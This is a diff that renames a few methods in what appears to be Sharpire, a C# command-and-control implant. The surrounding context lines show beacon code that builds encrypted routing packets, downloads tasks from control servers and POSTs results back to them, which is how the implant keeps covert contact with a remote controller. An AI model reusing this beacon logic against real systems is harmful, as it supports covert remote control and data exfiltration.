@@ -33,7 +33,7 @@ namespace Sharpire
                 encryptedBytesLength = encryptedBytes.Length;
             }
 
-            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentID());
+            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentId());
             byte lang = 0x03;
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
@@ -81,7 +81,7 @@ namespace Sharpire
                 byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                 uint packetLength = BitConverter.ToUInt32(routingData, 12);
 
-                if (sessionInfo.GetAgentID() == packetSessionId)
+                if (sessionInfo.GetAgentId() == packetSessionId)
                 {
                     byte[] encryptedData = packetData.Skip(offset).Take(offset + (int)packetLength - 1).ToArray();
                     offset += (int)packetLength;
@@ -109,7 +109,7 @@ namespace Sharpire
                 webClient.Headers.Add("Cookie", "session=" + routingCookie);
 
                 Random random = new Random();
-                string selectedTaskURI = sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)];
+                string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
                 results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
             }
             catch (WebException)
@@ -140,7 +140,7 @@ namespace Sharpire
 
                 try
                 {
-                    string taskUri = sessionInfo.GetTaskURIs()[random.Next(sessionInfo.GetTaskURIs().Length)];
+                    string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
                     webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                 }
                 catch (WebException) { }
@@ -189,7 +189,7 @@ namespace Sharpire
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return EncodePacket(1, systemInformation, packet.taskId);
                     case 2:
-                        string message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting";
+                        string message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting";
                         SendMessage(EncodePacket(2, message, packet.taskId));
                         Environment.Exit(0);
                         return new byte[0];
